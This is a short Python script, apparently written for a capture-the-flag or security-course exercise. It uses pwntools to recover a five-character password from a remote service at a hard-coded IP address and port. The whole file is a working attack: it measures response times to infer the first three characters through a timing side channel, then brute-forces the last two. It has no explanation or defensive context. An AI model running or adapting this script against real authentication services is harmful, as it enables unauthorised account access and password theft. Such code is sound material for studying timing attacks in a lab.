
import string
import itertools
import statistics
import pwn

N_PROBES = 3
PASS_LEN = 5
CHARS = string.ascii_letters + string.digits

guess = ''
time_dict = {}
while (len(guess) != PASS_LEN - 2):
    for char in CHARS:
        password = guess + char + 'a' * (PASS_LEN - len(guess) - 1)
        session = pwn.remote('141.85.224.119', 31337)
        mean_times = []
        for i in range(N_PROBES):
            start_time = pwn.time.time()
            session.send(password)
            response = session.recv()
            end_time = pwn.time.time()
            mean_times.append(end_time - start_time)
        time_dict[char] = statistics.median(mean_times)
    guess += sorted(time_dict.items(), key=lambda item: item[1], reverse=True)[0][0]

for chars in itertools.product(CHARS, repeat=2):
    ending = ''.join(chars)
    password = guess + ending
    session = pwn.remote('141.85.224.119', 31337)
    session.send(password)
    response = session.recv()
    if 'Wrong' not in response:
        print(password, response)
        break
    else:
        print('Searchin...')

